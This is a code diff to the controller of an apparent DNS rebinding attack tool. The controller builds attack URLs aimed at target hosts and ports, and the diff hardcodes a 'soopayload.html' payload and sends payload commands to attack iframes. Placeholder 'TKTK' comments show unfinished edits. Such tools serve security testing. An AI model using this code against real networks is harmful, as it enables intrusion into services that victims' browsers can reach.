@@ -334,7 +334,7 @@ const App = () => {
         document.getElementById('flushdns').checked = configuration.getFlushDns();
     };
 
-    function generateAttackUrl(targetHostIPAddress, targetPort, payload) {
+    function generateAttackUrl(targetHostIPAddress, targetPort, payload) {//TKTK payload unused
         return hosturl
             .replace("%1", configuration.getAttackHostIPAddress())
             .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
@@ -342,7 +342,8 @@ const App = () => {
             .replace("%4", configuration.getRebindingStrategy())
             .replace("%5", configuration.getAttackHostDomain())
             .replace("%6", targetPort)
-            .replace("%7", payload + "?rnd=" + Math.random())
+            //.replace("%7", payload + "?rnd=" + Math.random())
+            .replace("%7", "soopayload.html" + "?rnd=" + Math.random())
     };
 
     return {
@@ -429,6 +430,10 @@ const App = () => {
                 console.log("Iframe reports that attack has started");
                 clearInterval(fm.frame(fid).getTimer());
                 msg.source.postMessage({
+                    cmd: "payload",
+                    param: document.getElementById("payloads").value
+                }, "*");
+                msg.source.postMessage({
                     cmd: "interval",
                     param: configuration.getInterval()
                 }, "*");
@@ -491,7 +496,8 @@ const App = () => {
                 .replace("%4", document.getElementById("rebindingStrategy").value)
                 .replace("%5", document.getElementById("attackhostdomain").value)
                 .replace("%6", document.getElementById("targetport").value)
-                .replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
+                //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
+                .replace("%7", "/soopayload.html") + "?rnd=" + Math.random());
 
             self.addFrameToDOM(fm.frame(fid));
 
@@ -511,7 +517,7 @@ function rebindingSuccessCb(msg) {
     console.log(`Iframe reports attack successful for ${window.location.hostname}\n${msg.data.response}`);
     if ((app.getConfiguration().getAlertSuccess() !== "false") &&
         (app.getConfiguration().getType() === "manager") &&
-        (document.getElementById("payloads").value !== "payload-hook-and-control.html")) {
+        (document.getElementById("payloads").value !== "payload-hook-and-control.html")) {//TKTK change name
         alert("Attack Successful: " + document.domain + " " + msg.data.response);
     }
 
